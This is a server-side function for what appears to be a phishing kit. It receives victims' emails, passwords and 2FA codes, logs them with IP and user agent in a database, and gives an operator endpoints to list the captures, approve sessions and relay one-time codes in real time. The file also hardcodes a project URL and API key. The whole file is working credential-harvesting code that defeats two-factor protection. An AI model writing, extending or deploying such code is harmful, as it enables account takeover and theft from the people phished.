import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const supabaseClient = createClient(
      'https://nqsdardermkzppeaazbb.supabase.co',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
    )

    const url = new URL(req.url)
    const path = url.pathname

    // Handle different endpoints
    if (path === '/api/submit' && req.method === 'POST') {
      const body = await req.json()
      const { email, password, twofa, userAgent, currentPage } = body

      // Get IP and location (simplified for demo)
      const clientIP = req.headers.get('x-forwarded-for') || 
                      req.headers.get('x-real-ip') || 
                      'unknown'

      // Insert into database
      const { data, error } = await supabaseClient
        .from('requests')
        .insert([
          {
            email,
            password,
            twofa,
            user_agent: userAgent,
            ip: clientIP,
            country: 'Unknown', // Could integrate with IP geolocation service
            page_status: currentPage || 'Login'
          }
        ])
        .select()

      if (error) {
        console.error('Database error:', error)
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      return new Response(JSON.stringify({ success: true, data }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // Handle admin requests - get all requests
    if (path === '/api/requests' && req.method === 'GET') {
      const { data, error } = await supabaseClient
        .from('requests')
        .select('*')
        .order('created_at', { ascending: false })

      if (error) {
        return new Response(JSON.stringify({ error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      return new Response(JSON.stringify(data), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // Handle approval/denial
    if (path === '/api/approve' && req.method === 'POST') {
      const body = await req.json()
      const { id, decision, verificationCode } = body

      const { data, error } = await supabaseClient
        .rpc('approve_request', {
          request_id: id,
          decision: decision,
          verification_code_param: verificationCode
        })

      if (error) {
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      return new Response(JSON.stringify(data), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // Handle check approval status
    if (path === '/api/check-approval' && req.method === 'GET') {
      const email = url.searchParams.get('email')
      
      if (!email) {
        return new Response(JSON.stringify({ error: 'Email parameter required' }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400,
        })
      }

      const { data, error } = await supabaseClient
        .from('requests')
        .select('*')
        .eq('email', email)
        .order('created_at', { ascending: false })
        .limit(1)

      if (error) {
        return new Response(JSON.stringify({ error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      const request = data[0]
      if (!request) {
        return new Response(JSON.stringify({ status: 'not_found' }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        })
      }

      return new Response(JSON.stringify({ 
        status: request.status,
        verificationCode: request.verification_code 
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // Handle 2FA code submission
    if (path === '/api/submit-2fa' && req.method === 'POST') {
      const body = await req.json()
      const { email, code } = body

      const { data, error } = await supabaseClient
        .rpc('set_verification_code', {
          email_param: email,
          code_param: code
        })

      if (error) {
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      return new Response(JSON.stringify(data), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // Default 404 response
    return new Response('Not Found', {
      headers: corsHeaders,
      status: 404,
    })

  } catch (error) {
    console.error('Function error:', error)
    return new Response(JSON.stringify({ error: error.message }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 500,
    })
  }
}) 